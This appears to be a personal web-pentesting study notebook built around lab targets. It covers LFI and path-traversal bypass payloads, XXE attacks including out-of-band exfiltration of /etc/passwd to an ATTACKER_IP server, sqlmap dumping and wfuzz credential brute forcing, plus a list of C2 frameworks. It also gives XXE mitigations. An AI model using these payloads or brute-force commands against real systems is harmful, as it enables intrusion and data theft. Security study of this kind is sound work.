e.g. `cd .`, It stays in the current directory.
`http://webapp.thm/lab3.php?file=../../../../../etc/passwd/.`
### Bypass `../` filter
The app `../` with the empty string.
PHP filter only matches and replaces the first subset string `../`
![Pasted image 20240707095536.png|300](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240707095536.png)
`http://webapp.thm/index.php?lang=../../../../etc/passwd`
We got the following error!  
```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```
Payload to bypass it: `....//....//....//....//....//etc/passwd`
### Bypass forces directory
The developer forces the include to read from a defined directory! like:
`http://webapp.thm/index.php?lang=languages/EN.php`
the payload
`?lang=languages/../../../../../etc/passwd.`

# Check ![[Important files\|Important files]]


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Remote file inclusion
- Technique to include **remote files** into a vulnerable application
- This files can be loaded from other servers
- Occurs when improperly sanitizing user input.
- Allowing an attacker to inject an external URL into **include function.**
- One **requirement** is that the **allow_url_fopen** option needs to be **on**.
- Server access
	- RSA
	- logs (var/log)
- Consequences
	- Get a [[Operative System/Linux/Commands/Reverse shell\|reverse shell]]
	- Sensitive Information Disclosure
	- Cross-site Scripting ([[XSS\|XSS]])
	- Denial of Service ([[DoS\|DoS]])
![Pasted image 20240417200755.png|500](/img/user/Pasted%20image%2020240417200755.png)
![Pasted image 20240707105729.png|800](/img/user/attachments/Pasted%20image%2020240707105729.png)



</div></div>


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Acction review, view,
- Passive
- Check traffic
- What types of packets, protocols
- Open a port to listen

Active
- Modifier
- To know info from host, devices

Tools
- Wireshark
- Tshark
- netsniff-ng
- ettercap
- 
- zeek
- brim
- fiddler
- Bruteshark
- rita
- security onion
- 
- betrecap
- 

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To make web pages
- high level
- No coding
- meet the target
- logs along time
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



scan page to get important info

	whatweb IP

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To scan vulns of pages.
- discover possible vulnerabilities: Sensitive files, Outdated servers and programs (i.e. [vulnerable web server installs](https://httpd.apache.org/security/vulnerabilities_24.html)), Common server and software misconfigurations (Directory indexing, cgi scripts, x-ss protections)
- webserver or application (I.e. Apache2, Apache Tomcat, Jenkins or JBoss) and will look for any sensitive files or directories (i.e. login.php, /admin/, etc)

| Option                                        | Description                                                                   |
| --------------------------------------------- | ----------------------------------------------------------------------------- |
| `nikto -h IPordomain`                         | Basic scan, retrieve the headers, look for any sensitive files or directories |
| `nikto -h 10.10.10.1 -p 80,8000,8080`         | Set ip and ports                                                              |
| `nmap -p80 172.16.0.0/24 -oG - \| nikto -h -` | Get the nmap output and do the scan                                           |
| `--list-plugins`                              | List them                                                                     |
| `nikto -h 10.10.10.1 -Plugin apacheuser`      | Use the apache plugin                                                         |
| `-Display 2`                                  | Verbose 1,2 or E                                                              |
| `-Tuning 0`                                   | Tuning vulns scan 0,1,2,3.....                                                |
| `nikto -h http://ip_address -o report.html`   | Save file to html, or txt<br>It could be specificated the format with `-f`    |
## Plugins
| Plugin Name   | Description                                                                                                                                                                           |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| apacheusers   | Attempt to enumerate Apache HTTP Authentication Users                                                                                                                                 |
| cgi           | Look for CGI scripts that we may be able to exploit                                                                                                                                   |
| robots        | Analyse the robots.txt file which dictates what files/folders we are able to navigate to                                                                                              |
| dir_traversal | Attempt to use a directory traversal attack (i.e. LFI) to look for system files such as /etc/passwd on Linux (http://ip_address/application.php?view=../../../../../../../etc/passwd) |
## Verbosing our Scan
| Argument | Description                                          | Reasons for Use                                                                                                                                                                                                         |
| -------- | ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1        | Show any redirects that are given by the web server. | Web servers may want to relocate us to a specific file or directory, so we will need to adjust our scan accordingly for this.                                                                                           |
| 2        | Show any cookies received                            | Applications often use cookies as a means of storing data. For example, web servers use sessions, where e-commerce sites may store products in your basket as these cookies. Credentials can also be stored in cookies. |
| E        | Output any errors                                    | This will be useful for debugging if your scan is not returning the results that you expect!                                                                                                                            |
## Tuning Your Scan for Vulnerability Searching
only include the ones that you may commonly use.

| Category Name                     | Description                                                                                                                                                        | Tuning Option |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------- |
| File Upload                       | Search for anything on the web server that may permit us to upload a file. This could be used to upload a reverse shell for an application to execute.             | 0             |
| Misconfigurations / Default Files | Search for common files that are sensitive (and shouldn't be accessible such as configuration files) on the web server.                                            | 2             |
| Information Disclosure            | Gather information about the web server or application (i.e. verison numbers, HTTP headers, or any information that may be useful to leverage in our attack later) | 3             |
| Injection                         | Search for possible locations in which we can perform some kind of injection attack such as XSS or HTML                                                            | 4             |
| Command Execution                 | Search for anything that permits us to execute OS commands (such as to spawn a shell)                                                                              | 8             |
| SQL Injection                     | Look for applications that have URL parameters that are vulnerable to SQL Injection                                                                                | 9             |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### ![[Pentesting Web/wpscan\|wpscan]]
### Enum plugins
```shell
curl -s -x GET "webpage.com_oripandport" | grep plugins
```
### Regular expresion (regex)
```sh
curl -s -x GET "webpage.com_oripandport" | grep -oP 'plugins/\K[^/]+' | sort -u
```
### File xmlrpc
https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
check important file

	IP:PORT/xmlrpc.php
test post

	curl -s -X POST "IP:PORT/xmlrpc.php"
If accept, search abussing file
search available methods to enum valid credentials (wp.getUserlogs)
List methods

	curl -s -X POST "IP:PORT/xmlrpc.php" -d@file.xml

file.xml

	<?xml version="1.0" encoding="utf-8"?> 
	<methodCall> 
	<methodName>system.listMethods</methodName> 
	<params></params> 
	</methodCall>

Brute force attack
Test reques with file2 attack
file2.xml

	<?xml version="1.0" encoding="UTF-8"?>
	<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params> 
	<param><value>\{\{your username\}\}</value></param> 
	<param><value>\{\{your password\}\}</value></param> 
	</params> 
	</methodCall>

### wpseku

### wordprescan

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



joomscan

	https://github.com/OWASP/joomscan

install

	git clone https://github.com/rezasp/joomscan.git
	cd joomscan
	perl joomscan.pl

exec scan

	perl joomscan.pl -u <URL>

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### Droopescan
https://github.com/SamJoan/droopescan

Install
```sh
sudo pip install droopescan
```

Scan
```sh
droopescan scan drupal --url https://example.com
```

### drupwn

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### magescan
https://github.com/steverobbins/magescan
```sh
php magescan.phar scan:all https://example.com
```

### magereport
https://www.magereport.com/

</div></div>

## builtiwith
- Online
- Find out what websites are Built With
https://builtwith.com/

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Html-Injection-Payloads.txt

- HTML Injection is a vulnerability that occurs when unfiltered user input is displayed on the page. 
- If a website fails to sanitise user input (filter any "malicious" text that a user inputs into a website), and that input is used on the page, an attacker can inject HTML code into a vulnerable website.

- Input sanitisation is very important in keeping a website secure, as information a user inputs into a website is often used in other frontend and backend functionality. 
- A vulnerability you'll explore in another lab is database injection, where you can manipulate a database lookup query to log in as another user by controlling the input that's directly used in the query - but for now, let's focus on HTML injection (which is client-side).

- When a user has control of how their input is displayed, they can submit HTML (or JavaScript) code, and the browser will use it on the page, allowing the user to control the page's appearance and functionality.
![Pasted image 20240107224810.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240107224810.png)
- The image above shows how a form outputs text to the page. 
- Whatever the user inputs into the "What's your name" field is passed to a JavaScript function and output to the page,
- which means if the user adds their own HTML or JavaScript in the field, it's used in the sayHi function and is added to the page
- this means you can add your own HTML (such as a `<h1>` tag) and it will output your input as pure HTML.

- The general rule is never to trust user input. 
- To prevent malicious input, the website developer should sanitise everything the user enters before using it in the JavaScript function; in this case, the developer could remove any HTML tags.

Create hyperlink
```html
<a href="_url_">_link text_</a>
```



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- [[XML\|XML]] **E**xternal **E**ntity
- Extended marked.
- Use to magage Data base.
- a pdf is saved .
- can exec query servers.
- Fake request SSRF
- El ataque de entidad externa XML es un ataque de falsificación de solicitudes del lado servidor (SSRF)
- puede producirse cuando un analizador XML mal configurado permite a las aplicaciones analizar la entrada XML desde un origen poco fiable.
- Los atacantes pueden derivar la aplicación web de una víctima a una entidad externa mediante la inclusión de la referencia en la entrada XML maliciosa.
- Cuando esta entrada maliciosa es procesada por el analizador XML débilmente configurado de una aplicación web de destino, permite al atacante acceder a archivos y servicios protegidos desde servidores o redes conectadas.
- Allow **disclose** local **files**, **make** server-side **requests**, or **execute remote code**.


![Pasted image 20230909101156.png](/img/user/Networking/Seguridad%20en%20redes/Fundamentos%20de%20seguridad%20ofensiva/attachments/Pasted%20image%2020230909101156.png)
# [[XML\|XML]]
# XML Parsing
- **process** by which an XML file is read.
- its information is **accessed** and **manipulated** by a **software** program.
- **convert data** from XML format into DOM tree or others
- may **validate** XML data against a schema or a DTD, ensuring the structure conforms to certain rules.
## Common XML parsers
**used** across different programming environments;
each parser may handle XML data differently, which can affect **vulnerability** to XXE injection.
- **[[DOM\|DOM]] (Document Object Model) Parser**: **builds** the entire XML **document** into a memory-based **tree** structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
- **SAX (Simple API for XML) Parser**: Parses XML data sequentially **without loading the whole document** into memory, making it suitable **for large** XML **files**. However, it is less flexible for accessing XML data randomly.
- **StAX (Streaming API for XML) Parser**: Similar to SAX, StAX parses XML documents in a **streaming** **fashion** but gives the programmer more control over the XML parsing process.
- **XPath Parser**: Parses an XML document **based on expression** and is used extensively in conjunction with **XSLT**.
# Exploiting In-Band
- The attacker **can see the response** from the server
- **Straightforward** data exfiltration and exploitation.
## Example 1
A vulnerable request.
```xml
<?xml version="1.0" encoding="UTF-8"?>
	<contact>
		<name>
			ge0
		</name>
		<email>
			ge0@email.com
		</email>
		<message>
			text
		</message>
	</contact>
```

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
	<contact>
		<name>
			&xxe;
		</name>
		<email>
			ge0@email.com
		</email>
		<message>
			text
		</message>
	</contact>
```
## Example 2
Valid request
```xml
<acceso>
    <nombredeusuario>Jaime</nombredeusuario>
    <contrasena>clave</contrasena>
</acceso>
```

Normal request
```xml
<?xml version="1.0" encoding="UTF-8"?><root><name>Carlos</name><tel>318211231312</tel><email>carlos@correo.com</email><password>clavesecreta</password></root>
``` 
 
Malicious request
 ```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE jar [
<!ELEMENT jar ANY >
<!ENTITY xxe SYSTEM "file:///c:/WINDOWS/ODBC.INI" >]><root><name>Carlos</name><tel>318211231312</tel><email>&xxe;</email><password>clavesecreta</password></root>
```
## XML Entity Expansion
- is a **technique** often used in XXE attacks
- **defining entities** within an XML document, which the XML parser then **expands**.
- **Attackers** can **abuse** this feature by creating recursive or excessively large entities, leading to a [[DoS\|DoS]] **attack** or defining external entities **referencing** sensitive **files** or **services**.
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```
- small XML document recursively expands to consume server resources, leading to a **denial of service**.
# Exploiting Out-of-band
- The attacker **cannot see the response** from the server.
- Requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data.
## Check connection
For this attack, we will need a server that will receive data from other servers.
Check if the server is receiving the request.
```python
python -m http.server 4747
```

In the request add the code
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:4747/" >]>
<upload><file>&xxe;</file></upload>
```
## Script
[[xxe_oob.sh\|xxe_oob.sh]]
## DTD load from the server
### If we can create an entity `<file>&exfil;</file>`
**In the server** create an `sample.dtd` and run it again.
```dtd
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:4747/?data=%cmd;'>">
%oobxxe;
```
- Declaration of an entity `%cmd` that points to a system resource. It retrieves the content of `/etc/passwd`. filter encodes the content in **Base64** format to avoid formatting problems.
- **`%oobxxe`** entity contains `exfil`, has a system identifier pointing to the attacker-controlled server. Includes `%cmd` is Base64-encoded content of `/etc/passwd`.
- When `%oobxxe;` is parsed, it creates the `exfil` entity that connects to an attacker's server.
- The parameter `?data=%cmd` sends the Base64-encoded content from `%cmd`.

The request code.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:4747/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```
After send it we will receive the base64 code on the python server.
### If we can't create an entity
**In the server** create an `sample.dtd` and run it again.
```dtd
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:4747/?data=%cmd;'>">
%oobxxe;
%exfil;
```

We can't define an `&exfil` in the code.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:4747/sample.dtd">
%xxe;
]>
```
After send it we will receive the base64 code on the python server.
# [[SSRF\|SSRF]] + [[Networking/Seguridad en redes/Fundamentos de seguridad ofensiva/XXE\|XXE]]
- **Manipulate** XML **input** to make the server issue **requests** to **internal services** or access **internal files**.
- This technique can be used to **scan** internal **networks**, **access** restricted **endpoints**, or **interact** with **services** that are only accessible from the server’s local network.
## Internal network scanning
- Consider a scenario where a vulnerable **server hosts another** web **application** **internally** on a non-standard port.
- Exploit to makes the server send a request to its own internal network resource.
This malicious request to the server on the port 10
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:10/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```
## Risk
- **Reconnaissance**: Attackers can **discover services running** on internal network ports and gain insights into the server's internal architecture.
- **Data Leakage**: If the internal service **returns sensitive information,** it could be exposed externally through errors or XML data output.
- **Elevation of Privilege**: Accessing internal services could lead to further exploits, potentially escalating an attacker's capabilities within the network.
# Mitigation
- Adjust XML parser settings can significantly reduce the risk of XXE attacks.

## General Best Practices

1. **Disable External Entities and DTDs**: As a best practice, disable the processing of external entities and DTDs in your XML parsers. Most XXE vulnerabilities arise from malicious DTDs.
2. **Use Less Complex Data Formats**: Where possible, consider using simpler data formats like JSON, which do not allow the specification of external entities.
3. **Allowlisting Input Validation**: Validate all incoming data against a strict schema that defines expected data types and patterns. Exclude or escape XML-specific characters such as <, >, &, ', and ". These characters are crucial in XML syntax and can lead to injection attacks if misused.
## Mitigation Techniques in Popular Languages

**Java**

Use the `DocumentBuilderFactory` and disable DTDs:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**.NET**

Configure XML readers to ignore DTDs and external entities:

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP**

Disable loading external entities by libxml:

```php
libxml_disable_entity_loader(true);
```

**Python**

Use `defusedxml` library, which is designed to mitigate XML vulnerabilities:

```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

## Regularly Update and Patch

- **Software Updates**: Keep all XML processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.
- **Security Patches**: Regularly apply security patches to web applications and their environments.

## Security Awareness and Code Reviews

- **Conduct Code Reviews**: Regularly review code for security vulnerabilities, especially code that handles XML input and parsing.
- **Promote Security Training**: Ensure developers are aware of secure coding practices, including the risks associated with XML parsing.

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- **L**ocal **F**ile **I**nclusion
- Access to file usually not accessible
- A fuzzer is useful
- Occurs on PHP, ASP, JSP, or even in Node.js apps.
- **Developers**' lack of **security awareness**. using functions such as include, require, include_once, and require_once often contribute to **vulnerable** web applications.
- Same concepts as [[Pentesting Web/Path Traversal\|path traversal]].
- Extract info: Users, proccess, groups
![Pasted image 20240417200528.png](/img/user/Pasted%20image%2020240417200528.png)
# Examples
## Example1
Suppose the web application provides two languages, and the user can select between the EN and AR
```php
<?PHP 
	include($_GET["lang"]);
?>
```
- Uses a **GET** request via the URL parameter **lang** to include the file of the page.
- The call can be done by sending the following HTTP request as follows: 
  `http://webapp.thm/index.php?lang=EN.php` to load the English page or `http://webapp.thm/index.php?lang=AR.php`
- `EN.php` and `AR.php` files exist in the same directory.
- `http://webapp.thm/index.php?lang=EN.php?file=/etc/passwd`
## Example 2
`http://webapp.thm/index.php?lang=EN`
If we enter an invalid input, such as THM Error:
We need to avoid the `php`extension
```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
The function looks like:  include(languages/THM.php);.
Trying `http://webapp.thm/index.php?lang=../../../../etc/passwd`
```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
###  [[Poison Null Byte\|Poison Null Byte]]
Using it
`http://webapp.thm/lab3.php?file=../../../../../etc/passwd%00`
`include("languages/../../../../../etc/passwd%00").".php");` which equivalent to `include("languages/../../../../../etc/passwd");`
### Bypass filter keywords
Now the site has a filter keywords like `sensitive files are now allowed`
####  [[Poison Null Byte\|Poison Null Byte]]
`http://webapp.thm/lab3.php?file=../../../../../etc/passwd%00`
#### Try `/.`
e.g. `cd .`, It stays in the current directory.
`http://webapp.thm/lab3.php?file=../../../../../etc/passwd/.`
### Bypass `../` filter
The app `../` with the empty string.
PHP filter only matches and replaces the first subset string `../`
![Pasted image 20240707095536.png|300](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240707095536.png)
`http://webapp.thm/index.php?lang=../../../../etc/passwd`
We got the following error!  
```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```
Payload to bypass it: `....//....//....//....//....//etc/passwd`
### Bypass forces directory
The developer forces the include to read from a defined directory! like:
`http://webapp.thm/index.php?lang=languages/EN.php`
the payload
`?lang=languages/../../../../../etc/passwd.`

# Check 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# ![[Important files - Linux\|Important files - Linux]]
# ![[Important files - Windows\|Important files - Windows]]

</div></div>



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Scan vulns

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Scan sqli vuln
- Important set argument 

| Option                                               | Description                                             |
| ---------------------------------------------------- | ------------------------------------------------------- |
| `--risk 3`                                           | explotar cualquier vulnerabilidad de SQLi que encuentre |
| `--dump`                                             | Get all info                                            |
| `sqlmap -u webpage`                                  | Basic scan                                              |
| `sqlmap -u webpage -D databasename`                  | Get db names                                            |
| `sqlmap -u webpage -D databasename -T tablename`     | Get table names                                         |
| `--dbms mysql`                                       | Specify DB                                              |
| `sqlmap -u webpage --cookie="login=xxx -p cookie --` | Test sqli on cookies fields                             |

## Exec using a cap of request with burpsuite (requestsql1)
```shell
sqlmap -r requestsql1file -p searchitem  
```

No questions mode
```shell
sqlmap -r requestsql1 -p searchitem --batch
```

show databases
```shell
sqlmap -r requestsql1 -p searchitem --batch --dbs
```

show tables of a db
```shell
sqlmap -r requestsql1 -p searchitem --batch -D db_name --tables
```

show columns of a table
```shell
sqlmap -r requestsql1 -p searchitem --batch -D db_name -T table_name --columns
```

show values of especific columns
```shell
sqlmap -r requestsql1 -p searchitem --batch -D db_name -T table_name -C column_name1,c..2 --dump
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Command and control
![Pasted image 20231023193548.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020231023193548.png)

![Pasted image 20231023193605.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020231023193605.png)
![Pasted image 20231210111351.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020231210111351.png)
### typically exhibits the following behaviours:

1. HTTP requests: C2 servers often communicate with compromised assets using HTTP(s) requests. These requests can be used to send commands or receive data.
2. Command execution: This behaviour is the most common, allowing attackers to execute OS commands inside the machine.
3. Sleep or delay: To evade detection and maintain stealth, threat actors typically instruct the running malware to enter a sleep or delay for a specific period. During this time, the malware won't do anything; it will only connect back to the C2 server once the timer completes.
### Metasploit pro
Rudy
### Merlin
Go
### Covenant
windows y .NET
Linux limitated
### Empire
Deprecated
to windows
Besed on powershell
### Sliver
Windows .NET
Extern conexion

	curl https://sliver.sh/install | sudo bash
	sliver
	http -l 80
	https -l 8080
### Atomic red team
windows
Powershell
Mitre Att&ck
### PoshC2
Multiplatform
[[Operative System/Docker\|Docker]]
Python

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



is a program running on a remote server.
- Products database: This database contains details about the products, such as name, images, specifications, and price.
- Customers database: It contains all details related to customers, such as name, address, email, and phone number.
- Sales database: We expect to see what each customer has purchased and how they paid in this database.
### four steps:

1. The user enters an item name or related keywords in the search field. The web browser sends the search keyword(s) to the online shopping web application.
2. The web application queries (searches) the products database for the submitted keywords.
3. The product database returns the search results matching the provided keywords to the web application.
4. The web application formats the results as a friendly web page and returns them to the user.
![Pasted image 20231027235939.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020231027235939.png)
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![Pasted image 20231028000015.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020231028000015.png)
### Identification and Authentication Failure
- Allowing the attacker to use brute force, i.e., try many passwords, usually using automated tools, to find valid login credentials.
- Allowing the user to choose a weak password. A weak password is usually easy to guess.
- Storing the users’ passwords in plain text. If the attacker manages to read the file containing the passwords, we don’t want them to be able to learn the stored password.
### Broken Access Control
- Failing to apply _the principle of the least privilege_ and giving users more access permissions than they need. For example, an online customer should be able to view the prices of the items, but they should not be able to change them.
- Being able to view or modify someone else’s account by using its unique identifier. For example, you don’t want one bank client to be able to view the transactions of another client.
- Being able to browse pages that require authentication (logging in) as an unauthenticated user. For example, we cannot let anyone view the webmail before logging in.
### ![[Pentesting Web/IDOR\|IDOR]]
### Injection
An injection attack refers to a vulnerability in the web application where the user can insert malicious code as part of their input. One cause of this vulnerability is the lack of proper validation and sanitization of the user’s input.
### Cryptographic Failures
- Sending sensitive data in clear text, for example, using HTTP instead of HTTPS. HTTP is the protocol used to access the web, while HTTPS is the secure version of HTTP. Others can read everything you send over HTTP, but not HTTPS.
- Relying on a weak cryptographic algorithm. One old cryptographic algorithm is to shift each letter by one. For instance, “TRY HACK ME” becomes “USZ IBDL NF.” This cryptographic algorithm is trivial to break.
- Using default or weak keys for cryptographic functions. It won’t be challenging to break the encryption that used `1234` as the secret key.

</div></div>


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Captures and enables manipulation of all the HTTP/HTTPS traffic between a browser and a web server.

set proxy with foxyproxy

[[Pentesting Web/download certificate\|download certificate]]

Send to repeater `ctrl + R`

Send (on repeater) `ctrl + space`
## Features
### [[Pentesting Web/Proxy tab\|Proxy tab]]
Intercept and modify requests/responses when interacting with web applications.
### [[Pentesting Web/Repeater tab\|Repeater tab]]
Capture, modify, then resend the same request numerous times
### [[Pentesting Web/Intruder\|Intruder]]

### [[Pentesting Web/Decoder\|Decoder]]
provides a valuable service when transforming data -- either in terms of decoding captured information, or encoding a payload prior to sending it to the target.
### [[Pentesting Web/Comparer\|Comparer]]
Allows us to compare two pieces of data at either word or byte level.
### [[Pentesting Web/Sequencer\|Sequencer]]
Assessing the randomness of tokens such as session cookie values or other supposedly random generated data.
### [[Pentesting Web/Target tab\|Target tab]]
## [[Pentesting Web/Extensions\|Extensions]]
## Shortcuts
| shortcut | Function |
| ---- | ---- |
| `Ctrl + Shift + D` | Switch to the Dashboard |
| `Ctrl + Shift + T` | Switch to the Target tab |
| `Ctrl + Shift + P   ` | Switch to the Proxy tab |
| `Ctrl + Shift + I   ` | Switch to the Intruder tab |
| `Ctrl + Shift + R   ` | Switch to the Repeater tab |
| `Ctrl + R` | Send to repeater |
| `Ctrl + I` | Send to intruder |
| `Ctrl + Space` | Send reques(On repeater) |



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Blue team threat book

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Guide book of processes all persons to defend
- 3 years
- Update using a red team champain

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Black box
- Detect errors no controled
- Insert data on head, and body
- Dics
	Seclist, rockyou(passwd)
	/usr/share/worldlist/SecLists/Discovery/Web-Content/CMS
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Directories
 ```sh
wfuzz -c --hc=403,404 -t 10 -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u webpage/FUZZ
```

| Option                                    | Description                                                  |
| ----------------------------------------- | ------------------------------------------------------------ |
| `-c`                                      | colors                                                       |
| `--hc=404,403`                            | Hide codes                                                   |
| `-t 10`                                   | 10 multithreat                                               |
| `--sc=202`                                | Show codes                                                   |
| `-w`                                      | Set dic                                                      |
| `-u`                                      | set webpage_or_IP/`FUZZ`                                     |
| `-u webpage/FUZZ.html`                    | Show .html                                                   |
| `-z list,html-txt-php webpage/FUZZ.FUZ2Z` | Show some type of files                                      |
| `-z range,1-20000 webpage.com/id_FUZZ`    | Test range of values of webpage                              |
| `--sl=216`                                | Just show responds with 216 lines                            |
| `--hl=216`                                | hide line responds with 216 lines                            |
| `--hw=456`                                | hide word amount                                             |
| `-X PUT http://example.com/FUZZ`          | petición con un método HTTP personalizado, como PUT o DELETE |

subdomains, colors `-c`, hide code 403
```shell
wfuzz -c --hc=403 -t 20 -w /usr/share/SecList/Discovery/DNS/subdomains...txt -H "Host: FUZZ.page.com" https://page.com
```
# Subdomain virtual host (subdomains)
Subdomain virtual host
```shell
wfuzz -c -w tempdic3.txt -H "Host: FUZZ.page.com" -u http://10.10.24.58  
```
```shell
wfuzz -c --hc=403 -t 20 -w /usr/share/SecList/Discovery/DNS/subdomains...txt -H "Host: FUZZ.page.com" https://page.com
```
# Username enumeration if the page show "username already exists"
```sh
wfuzz -v -c -w tempdic2.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.24.58/customers/signup -H "Referer: http://10.10.24.58/customers/signup" --ss "username already exists"
```
# Username and password brute force
```sh
wfuzz -c --hc 200 -w namesdic.txt -z file,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -X POST -d "username=FUZZ&password=FUZ2Z" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.24.58/customers/login
```

---
# Password cracker
```shell
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.161.126/login.php -d "username=FUZZ&password=FUZ2Z"
```
- `-z file,usernames.txt` loads the usernames list.
- `-z file,passwords.txt` uses the password list generated by CeWL.
- `--hs "Please enter the correct credentials"` hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
- `-u` specifies the target URL.
- `-d "username=FUZZ&password=FUZ2Z"` provides the POST data format where **FUZZ** will be replaced by usernames and **FUZ2Z** by passwords.
---


</div></div>

# [[Hacking Ético y Pentesting/gobuster\|gobuster]]
# [[Pentesting Web/ffuf\|ffuf]]
# [[Hacking Ético y Pentesting/dirb\|dirb]]
# [[Hacking Ético y Pentesting/CeWL\|CeWL]]
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



**HTTP Status Codes:**

In the previous task, you learnt that when a HTTP server responds, the first line always contains a status code informing the client of the outcome of their request and also potentially how to handle it. These status codes can be broken down into 5 different ranges:

|   |   |
|---|---|
|**100-199 - Information Response**|These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common.|
|**200-299 - Success**|This range of status codes is used to tell the client their request was successful.|
|**300-399 - Redirection**|These are used to redirect the client's request to another resource. This can be either to a different webpage or a different website altogether.|
|**400-499 - Client Errors**|Used to inform the client that there was an error with their request.|
|**500-599 - Server Errors**|This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.|

| Código | Descripción |
| ---- | ---- |
| 100 | Information error. |
| 200 | OK - La solicitud ha tenido éxito. |
| 201 | Creado - La solicitud ha tenido éxito y se ha creado un nuevo recurso. |
| 204 | Sin contenido - La solicitud ha tenido éxito, pero no hay contenido para enviar. |
| 300 | Redirect. |
